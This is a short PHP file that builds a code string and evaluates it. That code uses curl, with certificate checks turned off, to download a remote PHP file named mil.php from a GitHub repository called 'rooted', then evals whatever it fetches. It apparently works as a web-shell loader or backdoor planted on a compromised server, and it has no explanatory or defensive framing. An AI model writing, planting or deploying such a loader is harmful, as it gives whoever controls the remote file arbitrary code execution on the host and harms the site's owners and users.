<?php
$z = "";
$z .= "\$url = 'https://raw.githubusercontent.com/Cnull00/rooted/refs/heads/main/mil.php
';\n";
$z .= "\$ch = curl_init(\$url);\n";
$z .= "curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n";
$z .= "curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);\n";
$z .= "curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n";
$z .= "\$fileContents = curl_exec(\$ch);\n";
$z .= "curl_close(\$ch);\n";
$z .= "if (\$fileContents === false) {\n";
$z .= "    die('[!] component : https://raw.githubusercontent.com/Cnull00/rooted/refs/heads/main/mil.php
');\n";
$z .= "}\n";
$z .= "eval(\"?>\" . \$fileContents);\n";

eval($z);
?>